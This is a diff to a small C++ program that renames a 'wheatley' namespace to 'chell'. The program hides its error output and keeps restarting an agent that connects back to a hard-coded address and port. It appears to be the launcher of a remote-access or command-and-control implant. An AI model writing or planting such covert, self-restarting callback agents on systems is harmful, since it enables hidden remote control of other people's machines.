@@ -1,12 +1,12 @@
 #include <iostream>
-#include <wheatley/common/agent.hpp>
+#include <chell/common/agent.hpp>
 #include <stdio.h>
-#include <wheatley/common/stdio.hpp>
+#include <chell/common/stdio.hpp>
 
 int main()
 {
     FILE* stream = freopen("NUL", "w", stderr);
-    std::unique_ptr<wheatley::Agent> agent = std::make_unique<wheatley::Agent>();
+    std::unique_ptr<chell::Agent> agent = std::make_unique<chell::Agent>();
     while (true) {
         try {
             agent->run("172.24.128.1", 0x3333);
@@ -17,6 +17,6 @@ int main()
         if (agent->wasDestroyed) {
             break;
         }
-        agent = std::make_unique<wheatley::Agent>();
+        agent = std::make_unique<chell::Agent>();
     }
 }
